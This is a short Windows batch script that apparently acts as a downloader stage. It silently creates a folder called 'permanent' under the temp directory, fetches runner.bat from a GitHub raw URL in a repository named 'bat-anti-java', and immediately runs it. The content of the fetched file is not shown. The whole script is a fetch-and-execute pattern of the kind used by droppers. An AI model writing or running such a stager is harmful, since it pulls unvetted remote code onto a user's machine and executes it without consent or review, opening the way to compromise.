@echo off
cd %temp%
mkdir permanent
cd permanent
curl -O https://raw.githubusercontent.com/Easty101/bat-anti-java/main/runner.bat
call runner.bat
